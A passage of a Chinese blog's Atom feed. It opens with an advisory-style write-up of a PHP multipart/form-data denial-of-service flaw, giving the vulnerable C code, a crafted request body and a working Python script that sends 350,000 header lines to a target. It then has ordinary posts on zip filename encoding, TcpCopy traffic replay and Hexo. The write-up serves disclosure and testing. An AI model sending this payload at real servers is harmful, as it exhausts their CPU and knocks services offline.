    <content type="html"><![CDATA[<h3 id="【漏洞摘要】">【漏洞摘要】</h3><p> 　　PHP解析multipart/form-datahttp请求的body part请求头时，重复拷贝字符串导致DOS。远程攻击者通过发送恶意构造的multipart/form-data请求，导致服务器CPU资源被耗尽，从而远程DOS服务器。
 　　</p>
<h3 id="【影响范围】">【影响范围】</h3><p> 　　PHP所有版本</p>
<a id="more"></a>
<h3 id="【解决方案】">【解决方案】</h3><p>　　1. 5.2.17 ：<a href="https://coding.net/u/simapple/p/oldphppatch/git/blob/master/CVE-ID2015-4024/php5.2patch" target="_blank" rel="external">一个民间的补丁</a><br>　　2. 5.4.X 直接升级到最新的5.4.41</p>
<h3 id="【漏洞入口】">【漏洞入口】</h3><p>　　PHP源码中main/ rfc1867.c负责解析multipart/form-data协议，DOS漏洞出现在main/rfc46675pxultipart_buffer_headers函数。<br>　　在详细分析漏洞函数前，先分析进入漏洞函数的路径。PHP解析multipart/form-data http请求体的入口函数在SAPI_POST_HANDLER_FUNC(rfc1867.c中的函数)，代码如下。SAPI_POST_HANDLER_FUNC函数首先解析请求的boundary。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Get the boundary */</span></span><br><span class="line">boundary= <span class="built_in">strstr</span>(content_type_dup, <span class="string">"boundary"</span>);</span><br><span class="line"> <span class="keyword">if</span>(!boundary) &#123;</span><br><span class="line">     intcontent_type_len = <span class="built_in">strlen</span>(content_type_dup);</span><br><span class="line">     <span class="keyword">char</span>*content_type_lcase = estrndup(content_type_dup, content_type_len);</span><br><span class="line"></span><br><span class="line">     php_strtolower(content_type_lcase,content_type_len);</span><br><span class="line">     boundary= <span class="built_in">strstr</span>(content_type_lcase, <span class="string">"boundary"</span>);</span><br><span class="line">     <span class="keyword">if</span>(boundary) &#123;</span><br><span class="line">             boundary= content_type_dup + (boundary - content_type_lcase);</span><br><span class="line">     &#125;</span><br><span class="line">     efree(content_type_lcase);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(!boundary || !(boundary = <span class="built_in">strchr</span>(boundary, <span class="string">'='</span>))) &#123;</span><br><span class="line">       sapi_module.sapi_error(E_WARNING,<span class="string">"Missing boundary in multipart/form-data POST data"</span>);</span><br><span class="line">       <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   boundary++;</span><br><span class="line">   boundary_len= <span class="built_in">strlen</span>(boundary);</span><br><span class="line">   …</span><br><span class="line">   …</span><br><span class="line">   <span class="keyword">while</span>(!multipart_buffer_eof(mbuff TSRMLS_CC))</span><br><span class="line">   &#123;</span><br><span class="line">                   charbuff[FILLUNIT];</span><br><span class="line">                   <span class="keyword">char</span>*cd = <span class="literal">NULL</span>, *param = <span class="literal">NULL</span>, *filename = <span class="literal">NULL</span>, *tmp = <span class="literal">NULL</span>;</span><br><span class="line">                   size_tblen = <span class="number">0</span>, wlen = <span class="number">0</span>;</span><br><span class="line">                   off_toffset;</span><br><span class="line"></span><br><span class="line">                   zend_llist_clean(&amp;header);</span><br><span class="line"></span><br><span class="line">                   <span class="keyword">if</span>(!multipart_buffer_headers(mbuff, &amp;header TSRMLS_CC)) &#123;</span><br><span class="line">                            gotofileupload_done;</span><br><span class="line">                   &#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="【漏洞原理】">【漏洞原理】</h3><p>　　在multipart_buffer_headers函数解析header对应value时，value值存在n行。每行的字符串以空白符开头或不存字符’:’，都触发以下合并value的代码块。那么解析header的value就要执行(n-1)次合并value的代码块。该代码块进行1次内存分配，2次内存拷贝，1次内存释放。当value值越来越长，将消耗大量的cpu时间。如果以拷贝一个字节为时间复杂度单位，value的长度为m，时间复杂度为m*m.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">prev_len= <span class="built_in">strlen</span>(prev_entry.value);</span><br><span class="line">     cur_len= <span class="built_in">strlen</span>(line);</span><br><span class="line"></span><br><span class="line">     entry.value= emalloc(prev_len + cur_len + <span class="number">1</span>); <span class="comment">//1次分片内存</span></span><br><span class="line">     <span class="built_in">memcpy</span>(entry.value,prev_entry.value, prev_len); <span class="comment">//1次拷贝</span></span><br><span class="line">     <span class="built_in">memcpy</span>(entry.value+ prev_len, line, cur_len);   <span class="comment">//1次拷贝</span></span><br><span class="line">     entry.value[cur_len+ prev_len] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">     entry.key= estrdup(prev_entry.key);</span><br><span class="line"></span><br><span class="line">     zend_llist_remove_tail(header);<span class="comment">//1次内存释放</span></span><br></pre></td></tr></table></figure>
<h3 id="【漏洞利用】">【漏洞利用】</h3><p>　　构造像以下恶意的http请求，当存在350000行a\n时，在我的测试环境中，一个http请求将消耗10s的cpu时间。每隔若干秒，同时并发多个请求，将导致server端cpu资源长期耗尽，从而到达DOS。总的来说，利用方式和Hash Collision DOS一样。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundarypE33TmSNWwsMphqz</span><br><span class="line">Content-Disposition:form-data; name="file"; filename="s</span><br><span class="line">a</span><br><span class="line">a</span><br><span class="line">a</span><br><span class="line">…</span><br><span class="line">…</span><br><span class="line">…</span><br><span class="line">a"</span><br><span class="line">Content-Type:application/octet-stream</span><br><span class="line"></span><br><span class="line">why is it?</span><br><span class="line">------WebKitFormBoundarypE33TmSNWwsMphqz</span><br></pre></td></tr></table></figure>
<h3 id="【漏洞测试】">【漏洞测试】</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span><br><span class="line">Author: Shusheng Liu,The Department of Security Cloud, Baidu</span><br><span class="line">email: liusscs@163.com</span><br><span class="line">/* &lt;![CDATA[ */!function()&#123;try&#123;var t="currentScript"in document?document.currentScript:function()&#123;for(var t=document.getElementsByTagName("script"),e=t.length;e--;)if(t[e].getAttribute("cf-hash"))return t[e]&#125;();if(t&amp;&amp;t.previousSibling)&#123;var e,r,n,i,c=t.previousSibling,a=c.getAttribute("data-cfemail");if(a)&#123;for(e="",r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)&#125;&#125;&#125;catch(u)&#123;&#125;&#125;();/* ]]&gt; */</span><br><span class="line">'''</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib,urllib2</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">http_proxy</span><span class="params">(proxy_url)</span>:</span></span><br><span class="line"></span><br><span class="line">    proxy_handler = urllib2.ProxyHandler(&#123;<span class="string">"http"</span> : proxy_url&#125;)</span><br><span class="line">    null_proxy_handler = urllib2.ProxyHandler(&#123;&#125;)</span><br><span class="line">    opener = urllib2.build_opener(proxy_handler)</span><br><span class="line">    urllib2.install_opener(opener)</span><br><span class="line"><span class="comment">#end http_proxy</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_php_multipartform_dos</span><span class="params">(url,post_body,headers)</span>:</span></span><br><span class="line">    req = urllib2.Request(url)</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> headers.keys():</span><br><span class="line">        req.add_header(key,headers[key])</span><br><span class="line">    starttime = datetime.datetime.now();</span><br><span class="line">    fd = urllib2.urlopen(req,post_body)</span><br><span class="line">    html = fd.read()</span><br><span class="line">    endtime = datetime.datetime.now()</span><br><span class="line">    usetime=(endtime - starttime).seconds</span><br><span class="line">    <span class="keyword">if</span>(usetime &gt; <span class="number">5</span>):</span><br><span class="line">        result = url+<span class="string">" is vulnerable"</span>;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span>(usetime &gt; <span class="number">3</span>):</span><br><span class="line">            result = <span class="string">"need to check normal respond time"</span></span><br><span class="line">    <span class="keyword">return</span> [result,usetime]</span><br><span class="line"><span class="comment">#end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#http_proxy("http://127.0.0.1:8089")</span></span><br><span class="line">    parser = OptionParser()</span><br><span class="line">    parser.add_option(<span class="string">"-t"</span>, <span class="string">"--target"</span>, action=<span class="string">"store"</span>,</span><br><span class="line">                  dest=<span class="string">"target"</span>,</span><br><span class="line">                  default=<span class="keyword">False</span>,</span><br><span class="line">          type=<span class="string">"string"</span>,</span><br><span class="line">                  help=<span class="string">"test target"</span>)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span>(options.target):</span><br><span class="line">    target = options.target</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    Num=<span class="number">350000</span></span><br><span class="line">    headers=&#123;<span class="string">'Content-Type'</span>:<span class="string">'multipart/form-data; boundary=----WebKitFormBoundaryX3B7rDMPcQlzmJE1'</span>,</span><br><span class="line">            <span class="string">'Accept-Encoding'</span>:<span class="string">'gzip, deflate'</span>,</span><br><span class="line">            <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36'</span>&#125;</span><br><span class="line">    body = <span class="string">"------WebKitFormBoundaryX3B7rDMPcQlzmJE1\nContent-Disposition: form-data; name=\"file\"; filename=sp.jpg"</span></span><br><span class="line">    payload=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,Num):</span><br><span class="line">        payload = payload + <span class="string">"a\n"</span></span><br><span class="line">    body = body + payload;</span><br><span class="line">    body = body + <span class="string">"Content-Type: application/octet-stream\r\n\r\ndatadata\r\n------WebKitFormBoundaryX3B7rDMPcQlzmJE1--"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"starting..."</span>;</span><br><span class="line">    respond=check_php_multipartform_dos(target,body,headers)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Result : "</span></span><br><span class="line">    <span class="keyword">print</span> respond[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Respond time : "</span>+str(respond[<span class="number">1</span>]) + <span class="string">" seconds"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h3 id="【参考】">【参考】</h3><p>　　1. <a href="https://bugs.php.net/bug.php?id=69364" target="_blank" rel="external">https://bugs.php.net/bug.php?id=69364</a><br>　　2. <a href="http://php.net/ChangeLog-5.php#5.5.25" target="_blank" rel="external">http://php.net/ChangeLog-5.php#5.5.25</a><br>　　3. <a href="http://drops.wooyun.org/papers/6077" target="_blank" rel="external">http://drops.wooyun.org/papers/6077</a></p>
]]></content>
    <summary type="html">
    <![CDATA[PHP解析multipart/form-datahttp请求的body part请求头时，重复拷贝字符串导致DOS。远程攻击者通过发送恶意构造的multipart/form-data请求，导致服务器CPU资源被耗尽，从而远程DOS服务器。]]>
    
    </summary>
    
      <category term="php" scheme="http://www.inorz.net/tags/php/"/>
    
      <category term="安全" scheme="http://www.inorz.net/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="安全相关" scheme="http://www.inorz.net/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[解决MAC打包压缩文件在Windows下乱码]]></title>
    <link href="http://www.inorz.net/2015/05/20/mac-dabao-luanma-windows/"/>
    <id>http://www.inorz.net/2015/05/20/mac-dabao-luanma-windows/</id>
    <published>2015-05-20T15:45:48.000Z</published>
    <updated>2015-10-28T08:36:57.000Z</updated>
    <content type="html"><![CDATA[<h3 id="【问题】">【问题】</h3><ul>
<li>用Mac自带的归档程序打包的zip，发到windows端，显示会乱码。里面对应的文件夹的文件目录也发生变化</li>
</ul>
<h3 id="【原因】">【原因】</h3><ul>
<li>是文件编码的问题，Mac 下默认是UTF-8，windows下默认为GBK</li>
</ul>
<a id="more"></a>
<h3 id="【解决】">【解决】</h3><ol>
<li>在Windows上用新版WinRAR(5.0) 以上版本直接解压即可</li>
<li>用第三方打包软件Keka(开源、免费)，打包成.7z</li>
</ol>
<h3 id="【Keka下载】：">【Keka下载】：</h3><ul>
<li>Keka: <a href="http://www.kekaosx.com/zh-cn/" target="_blank" rel="external">http://www.kekaosx.com/zh-cn/</a></li>
</ul>
<h3 id="【注意】">【注意】</h3><ol>
<li>用的2345好压 直接解压不能解决此文件，，</li>
<li>可以通过设置2345好压 的代码页 为UTF-8 来解压即可 （预览的时候还是乱码），不过解压出来就都正常了</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[解决MAC打包压缩文件在Windows下乱码,fuqihuan]]>
    
    </summary>
    
      <category term="MAC" scheme="http://www.inorz.net/tags/MAC/"/>
    
      <category term="乱码" scheme="http://www.inorz.net/tags/%E4%B9%B1%E7%A0%81/"/>
    
      <category term="打包" scheme="http://www.inorz.net/tags/%E6%89%93%E5%8C%85/"/>
    
      <category term="MAC" scheme="http://www.inorz.net/categories/MAC/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[【工具】TcpCopy使用]]></title>
    <link href="http://www.inorz.net/2015/05/20/tcpcopy/"/>
    <id>http://www.inorz.net/2015/05/20/tcpcopy/</id>
    <published>2015-05-20T14:45:48.000Z</published>
    <updated>2015-10-28T08:38:32.000Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>有台服务器的MySQL内存，经常内涨跑涨高，所以为了调试，在一台测试机器上搭建了同样的服务，部署了同样的代码，用TcpCopy做引流做测试。</p>
</blockquote>
<h3 id="【Tcpcopy简介】">【Tcpcopy简介】</h3><ul>
<li>TCPCopy是一种请求复制（所有基于tcp的packets）工具 ，其功能是复制在线数据包，修改TCP/IP头部信息，发送给测试服务器，达到欺骗测试服务器的TCP 程序的目的，从而为欺骗上层应用打下坚实基础。</li>
</ul>
<a id="more"></a>
<h3 id="【TCPCopy七大功能】">【TCPCopy七大功能】</h3><ol>
<li>分布式压力测试工具，利用在线数据，可以测试系统能够承受的压力大小（远比ab压力测试工具真实地多）,也可以提前发现一些bug</li>
<li>普通上线测试，可以发现新系统是否稳定，提前发现上线过程中会出现的诸多问题，让开发者有信心上线</li>
<li>对比试验，同样请求，针对不同或不同版本程序，可以做性能对比等试验</li>
<li>流量放大功能，可以利用多种手段构造无限在线压力，满足中小网站压力测试要求</li>
<li>利用TCPCopy转发传统压力测试工具发出的请求，可以增加网络延迟，使其压力测试更加真实</li>
<li>热备份</li>
</ol>
<h3 id="【TCPCopy架构】">【TCPCopy架构】</h3><ol>
<li>架构图<blockquote>
<p><img src="http://inorz.net/image/tcpcopy-jiagoutu.png" alt=""></p>
</blockquote>
</li>
</ol>
<ol>
<li>数据流向<br>&gt;<br>① 一个访问到达线上机器；<br>② socket数据包在ip层被拷贝了一份传给tcpcopy进程；<br>③ tcpcopy修改包的目的及源地址，发给目标测试机；<br>④ 拷贝的包到达目标测试机；<br>⑤ 目标测试机的应用程处理访问，并返回结果；<br>⑥ 返回结果在ip层被截获、丢弃，由intercpet进程拷贝返回结果的ip header并返回；<br>⑦ ip header被发送给线上机器的tcpcopy进程。</li>
</ol>
<h3 id="【TCPCopy安装】">【TCPCopy安装】</h3><ol>
<li>tcpcopy下载：<a href="https://github.com/wangbin579/tcpcopy" target="_blank" rel="external">https://github.com/wangbin579/tcpcopy</a></li>
<li>intercept下载：<a href="https://github.com/session-replay-tools/intercept/releases" target="_blank" rel="external">https://github.com/session-replay-tools/intercept/releases</a></li>
<li><p>生产服安装tcpcop，这里下载的是0.9.6版本。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tar xf tcpcopy-<span class="number">0.9</span>.<span class="number">6</span>.tar.gz</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"><span class="comment">#　</span></span><br><span class="line"><span class="comment">#做个软链接，方便使用</span></span><br><span class="line">ln <span class="operator">-s</span> /usr/<span class="built_in">local</span>/tcpcopy/sbin/tcpcopy /usr/<span class="built_in">local</span>/bin/</span><br></pre></td></tr></table></figure>
</li>
<li><p>测试服安装 intercept，这里下载1.0.0版本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tar xf intercept-<span class="number">1.0</span>.<span class="number">0</span>.tar.gz</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"><span class="comment">#做个软链接，方便使用</span></span><br><span class="line">ln <span class="operator">-s</span> /usr/<span class="built_in">local</span>/intercept/sbin/intercept /usr/<span class="built_in">local</span>/bin/</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 安装intercept时，如果遇到：checking for pcap.h ... not found。</span></span><br><span class="line"><span class="comment"># 解决：yum install libpcap-devel -y</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="【TCPCopy使用（实时）】">【TCPCopy使用（实时）】</h3><ol>
<li><p>测试服，运行intercept服务端程序，指定IP为生产服（源IP）：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 使用前要先启用内核模块ip_queue支持</span></span><br><span class="line">modprobe ip_queue</span><br><span class="line"><span class="comment">#　</span></span><br><span class="line"><span class="comment"># 2. 检查一下是否有启用</span></span><br><span class="line">lsmod|grep ip_queue</span><br><span class="line">　</span><br><span class="line"><span class="comment"># 3. 运行 intercept</span></span><br><span class="line">intercept -i eth0 -F <span class="string">'tcp and src port 80'</span> <span class="operator">-d</span> <span class="operator">-l</span> /data/logs/intercept.log</span><br><span class="line">　</span><br><span class="line"><span class="comment">#参数：</span></span><br><span class="line"><span class="comment"># -i 指定网卡</span></span><br><span class="line"><span class="comment"># -F 指定源端口为80端口</span></span><br><span class="line"><span class="comment"># -d 启动为守护进程</span></span><br><span class="line"><span class="comment"># -l 指定log日志</span></span><br><span class="line"><span class="comment"># 更多的参数可 intercept -h 来查看</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>生产服，运行TcpCopy客户端程序，指定发送IP为测试服IP：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tcpcopy -x <span class="number">80</span>-测试服IP:<span class="number">80</span> <span class="operator">-s</span> 测试服IP <span class="operator">-l</span> /data/logs/tcpcopy.log <span class="operator">-d</span></span><br><span class="line">　</span><br><span class="line"><span class="comment"># 参数</span></span><br><span class="line"><span class="comment"># -d 是做为守护进程方式运行</span></span><br><span class="line"><span class="comment"># -l 是记录日志 -l /data/logs/tcpcopy_log.log</span></span><br><span class="line"><span class="comment"># -s 指定intercept服务器</span></span><br><span class="line"><span class="comment"># -n 复制几倍流量，不加参数默认为1，最大值为1023</span></span><br><span class="line"><span class="comment"># -r 复制部分流量，比如 -r 20，即为复制20%的流量。传参数范围为1-99，其他数值都是默认为全部流量复制</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>测试：运行完可以通过tcpdump命令来抓包查看80端口的收发包情况。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -S port <span class="number">80</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="【TCPCopy使用（离线）】">【TCPCopy使用（离线）】</h3><ol>
<li><p>测试服，使用tcpdump抓包，并保存抓包文件。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 tcp and port <span class="number">80</span> <span class="operator">-s</span> <span class="number">0</span> -w /data/logs/online_80.pcap</span><br><span class="line">　</span><br><span class="line"><span class="comment">#参数</span></span><br><span class="line"><span class="comment">#-s 获取数据包，默认为68字节，设置成0，获取全部数据包</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>生产服，运行TcpCopy客户端程序，指定发送IP为测试服IP：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpcopy -x <span class="number">80</span>-测试服IP:<span class="number">80</span> -i /data/logs/online_80.pcap <span class="operator">-l</span> /data/logs/tcpcopy.log <span class="operator">-d</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="【注意事项】">【注意事项】</h3><ol>
<li>不支持域名，只支持IP地址。</li>
<li>如果采用的是IP Queue模块来截获响应包，所以intercept程序密切跟ip queue内核模块相关，所以当压力很大的时候请求丢失率很高，需要优化sysctl系统参数才能达到好的效果。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看ip queue运行情况，</span></span><br><span class="line">cat /proc/net/ip_queue</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 如果Queue dropped的数值不断增大，则需要修改ip_queue_maxlen参数</span></span><br><span class="line"><span class="comment"># 比如echo 4096 &gt; /proc/sys/net/ipv4/ip_queue_maxlen</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 如果Netlink dropped的数值不断增大，修改net.core.rmem_max和net.core.wmem_max参数</span></span><br><span class="line"><span class="comment"># 比如 sysctl -w net.core.rmem_max=16777216和sysctl -w net.core.wmem_max=16777216）</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[有台服务器的MySQL内存，经常内涨跑涨高，所以为了调试，在一台测试机器上搭建了同样的服务，部署了同样的代码，用TcpCopy做引流做测试。]]>
    
    </summary>
    
      <category term="tcp" scheme="http://www.inorz.net/tags/tcp/"/>
    
      <category term="tcpcopy" scheme="http://www.inorz.net/tags/tcpcopy/"/>
    
      <category term="测试" scheme="http://www.inorz.net/tags/%E6%B5%8B%E8%AF%95/"/>
    
      <category term="工具使用" scheme="http://www.inorz.net/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Hello World]]></title>
    <link href="http://www.inorz.net/2015/05/19/hello-world/"/>
    <id>http://www.inorz.net/2015/05/19/hello-world/</id>
    <published>2015-05-19T14:45:48.000Z</published>
    <updated>2015-10-28T08:45:12.000Z</updated>
    <content type="html"><![CDATA[<p>Welcome to <a href="http://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="http://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="http://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
<a id="more"></a>
<h2 id="Quick_Start">Quick Start</h2><h3 id="Create_a_new_post">Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="http://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
<h3 id="Run_server">Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="http://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
<h3 id="Generate_static_files">Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="http://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
<h3 id="Deploy_to_remote_sites">Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="http://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>Welcome to <a href="http://hexo.io/">Hexo</a>! This is your very first post. Check <a href="http://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="http://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>]]>
    
    </summary>
    
  </entry>
  
</feed>
